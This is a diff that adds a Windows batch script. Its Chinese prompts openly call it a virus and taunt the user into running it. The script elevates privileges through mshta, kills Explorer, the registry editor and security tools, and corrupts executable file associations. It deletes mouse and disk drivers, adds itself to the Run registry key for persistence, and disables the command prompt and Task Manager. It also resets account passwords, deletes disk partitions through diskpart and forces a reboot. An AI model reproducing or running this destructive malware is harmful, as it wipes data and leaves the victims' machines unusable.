@@ -1,0 +1,106 @@
+@echo off
+%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
+cd /d "%~dp0"
+
+set radre=%1
+if "%radre%" == "1" goto yes
+
+echo 你确定运行？这或许是你这人生中最可悲的决定
+echo 温馨提示，我是病毒
+set /p for=
+if %for% == yes goto yes
+if %for% == no goto no
+if %for% == 是的 goto yes
+if %for% == 不 goto no
+pause
+:no
+echo 你咋这么逊....连个病毒都不敢运行...
+pause
+exit
+exit
+:yes
+echo 这可是你选的啊：）
+
+cmd /k for /l %x in (1, 0, 10) do taskkill /f /t /im SuperKiller.exe
+cmd /k for /l %x in (1, 0, 10) do taskkill /f /t /im MMC.exe
+cmd /k for /l %x in (1, 0, 10) do taskkill /f /t /im Explorer.exe
+cmd /k for /l %x in (1, 0, 10) do taskkill /f /t /im regedit.exe
+cmd /k for /l %x in (1, 0, 10) do taskkill /f /t /im cmd.exe
+cmd /k for /l %x in (1, 0, 10) do taskkill /f /t /im SuperKillller.exe
+cmd /k for /l %x in (1, 0, 10) do taskkill /f /t /im HRSword.exe
+
+reg add HKCR\.exe  /ve /t REG_SZ /d 1234 /f
+reg add HKCR\.com  /ve /t REG_SZ /d 45514 /f
+reg add HKCR\.vbs  /ve /t REG_SZ /d 4514 /f
+reg add HKCR\.bat  /ve /t REG_SZ /d 1451 /f
+reg add HKCR\.inf  /ve /t REG_SZ /d 21651651 /f
+reg add HKCR\.sh  /ve /t REG_SZ /d 4514564 /f
+reg add HKCR\.reg /ve /t REG_SZ /d 4678676 /f
+reg add HKLM\SOFTWARE\Classes\.exe  /ve /t REG_SZ /d 157 /f
+reg add HKLM\SOFTWARE\Classes\.com  /ve /t REG_SZ /d 114 /f
+reg add HKLM\SOFTWARE\Classes\.vbs  /ve /t REG_SZ /d 1114 /f
+reg add HKLM\SOFTWARE\Classes\.bat  /ve /t REG_SZ /d 1567132 /f
+reg add HKLM\SOFTWARE\Classes\.sh  /ve /t REG_SZ /d 73453 /f
+reg add HKLM\SOFTWARE\Classes\.reg  /ve /t REG_SZ /d 4456 /f
+reg add HKLM\SOFTWARE\Classes\.inf /ve /t REG_SZ /d 12735 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Services\EventLog\System\Microsoft-Windows-MountMgr /v EventMessageFile /t REG_EXPAND_SZ /d 52 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96f-e325-11ce-bfc1-08002be10318} /v ClassDesc /t REG_SZ /d 174 /f
+del C:\Windows\System32\drivers\mouclass.sys
+del C:\Windows\System32\drivers\mountmgr.sys
+del C:\Windows\System32\drivers\mouhid.sys
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96b-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 192 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96b-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 277 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96f-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 174 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e967-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 385 /f
+del C:\Windows\System32\drivers\partmgr.sys
+del C:\Windows\System32\drivers\EhStorClass.sys
+del C:\Windows\System32\drivers\disk.sys
+del C:\Windows\System32\DriverStore\FileRepository\disk.inf_amd64_502e7d1dac536e52\disk.sys
+
+set name=%~n0
+copy "%~f0" C:\Windows\SysWOW64\oobe
+rename "C:\Windows\SysWOW64\oobe\%name%.bat" START.bat
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v admin /t REG_SZ /d "C:\Windows\SysWOW64\oobe\START.bat" 1 /f
+
+del C:\Windows\System32\drivers\mouhid.sys
+del C:\Windows\System32\drivers\mouhid.sys
+del C:\Windows\System32\DriverStore\FileRepository\msmouse.inf_amd64_1793a485b491b199\mouhid.sys
+del C:\Windows\System32\DriverStore\FileRepository\msmouse.inf_amd64_1793a485b491b199\mouclass.sys
+reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
+reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableExplorer /t REG_DWORD /d 1 /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
+reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1
+
+net user Adminstrator 45664
+net user adminstrator 75343
+net user Users 374543
+net user user 7373783
+net user User 11456
+net user 111 734312345
+
+diskpart
+select disk 0
+select partition 1
+delete partition
+select partition 2
+delete partition
+select partition 3
+delete partition
+select disk 1
+select partition 1
+delete partition
+select partition 2
+delete partition
+select partition 3
+delete partition
+exit
+
+shutdown -r -f -t 0
+shutdown -r -f
+
+
+
+
+
